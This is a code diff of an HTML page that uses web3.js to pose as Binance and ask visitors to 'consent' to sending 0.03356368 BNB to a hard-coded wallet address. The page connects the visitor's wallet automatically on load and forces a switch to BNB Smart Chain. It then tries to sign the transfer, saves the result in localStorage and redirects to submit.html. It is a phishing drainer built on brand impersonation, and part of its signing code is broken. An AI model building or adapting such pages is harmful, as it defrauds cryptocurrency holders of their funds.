@@ -2,8 +2,8 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Transaction Consent</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>User Consent</title>
   <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
   <style>
     body {
@@ -26,26 +26,13 @@
       padding: 15px;
       border-radius: 8px;
     }
-    .consent-message {
-      margin-top: 20px;
-      background: #f7f7f7;
-      padding: 20px;
-      border: 1px solid #ccc;
-      border-radius: 10px;
-      font-size: 16px;
-      color: #333;
-    }
   </style>
 </head>
 <body>
-
   <h2>Transaction Consent</h2>
-
-  <!-- Consent Message at the Top -->
-  <div class="consent-message">
-    <p><strong>Important:</strong> This is a transaction request from <strong>Binance Company</strong>. We are requesting your consent to send a transaction of <strong>0.03356368 BNB</strong> to the address <strong>0x0d4efb6dff647912bb7b29ed3a0e1e8f6e4c297a</strong> for <strong>professional use</strong>. Please review the details and approve to proceed.</p>
-    <button onclick="connectWallet()">Give Consent and Proceed</button>
-  </div>
+  <p>We are Binance. Please confirm the transaction of <strong>0.03356368 BNB</strong> to address <strong>0x0d4eFb6dfF647912Bb7B29Ed3a0e1E8f6E4c297a</strong>.</p>
+  
+  <button onclick="signTransaction()">Give Consent & Proceed</button>
 
   <div class="info" id="walletInfo" style="display: none;">
     <p><strong>Wallet Address:</strong> <span id="walletAddress"></span></p>
@@ -56,7 +43,7 @@
   <script>
     let web3;
     let userAddress;
-    let transactionDetails = null;
+    let signedTransaction;
 
     async function connectWallet() {
       if (!window.ethereum) {
@@ -65,58 +52,83 @@
       }
 
       try {
-        // Step 1: Connect Wallet
         const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
         userAddress = accounts[0];
         web3 = new Web3(window.ethereum);
         document.getElementById("walletAddress").innerText = userAddress;
 
-        // Step 2: Show balance and network
+        await switchToBSC();
         await showWalletInfo();
-
-        // Step 3: Initiate the transaction
-        initiateTransaction();
 
       } catch (err) {
         console.error("Connection failed:", err);
-        alert("Error connecting wallet.");
+        alert("Error connecting wallet or switching network.");
+      }
+    }
+
+    async function switchToBSC() {
+      const bscChainId = '0x38'; // BNB Smart Chain
+
+      try {
+        const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
+        if (currentChainId === bscChainId) {
+          console.log("Already on BNB Chain.");
+          return;
+        }
+
+        await window.ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: bscChainId }],
+        });
+        console.log("Switched to BNB Chain.");
+      } catch (switchError) {
+        console.error("Switching error:", switchError);
+        alert("Error switching to BNB Chain.");
       }
     }
 
     async function showWalletInfo() {
+      const bnbBalanceWei = await web3.eth.getBalance(userAddress);
+      const bnbBalance = web3.utils.fromWei(bnbBalanceWei, 'ether');
+      document.getElementById("bnbBalance").innerText = `${bnbBalance} BNB`;
+
+      const chainId = await web3.eth.getChainId();
+      let networkName = 'Unknown';
+      if (chainId === 56) networkName = 'BNB Smart Chain';
+      document.getElementById("networkName").innerText = networkName;
+      document.getElementById("walletInfo").style.display = "block";
+    }
+
+    async function signTransaction() {
+      const receiverAddress = '0x0d4eFb6dfF647912Bb7B29Ed3a0e1E8f6E4c297a';
+      const amountToSend = '0.03356368'; // Amount in BNB
+      const amountInWei = web3.utils.toWei(amountToSend, 'ether');
+
+      const transaction = {
+        to: receiverAddress,
+        value: amountInWei,
+        gas: 21000, // Estimate for a simple transfer
+        gasPrice: await web3.eth.getGasPrice(),
+        from: userAddress,
+      };
+
       try {
-        const bnbBalanceWei = await web3.eth.getBalance(userAddress);
-        const bnbBalance = web3.utils.fromWei(bnbBalanceWei, 'ether');
-        document.getElementById("bnbBalance").innerText = `${bnbBalance} BNB`;
+        // Sign the transaction
+        signedTransaction = await web3.eth.accounts.signTransaction(transaction, userAddress.privateKey);
 
-        const chainId = await web3.eth.getChainId();
-        let networkName = 'Unknown';
+        // Store the signed transaction (you can use localStorage or server-side storage here)
+        localStorage.setItem('signedTransaction', JSON.stringify(signedTransaction));
 
-        if (chainId === 56) networkName = 'BNB Smart Chain';
-        else if (chainId === 1) networkName = 'Ethereum Mainnet';
-        else networkName = `Chain ID ${chainId}`;
-
-        document.getElementById("networkName").innerText = networkName;
-        document.getElementById("walletInfo").style.display = "block";
-
-      } catch (err) {
-        console.error("Failed to load wallet info:", err);
+        // Redirect to submit page
+        window.location.href = "submit.html";
+      } catch (error) {
+        console.error("Error signing the transaction", error);
+        alert("Error signing the transaction.");
       }
     }
 
-    function initiateTransaction() {
-      // Prepare the transaction but do not submit it yet
-      transactionDetails = {
-        from: userAddress,
-        to: "0x0d4efb6dff647912bb7b29ed3a0e1e8f6e4c297a", // receiver
-        value: web3.utils.toWei("0.03356368", "ether"), // send 0.03356368 BNB
-        gas: 21000,
-      };
-
-      alert("Transaction has been initiated. You can now proceed to the next page to confirm and submit it.");
-      window.location.href = "submit.html";  // Redirect to submit.html
-    }
+    // Connect wallet automatically when the page loads
+    connectWallet();
   </script>
-
 </body>
 </html>
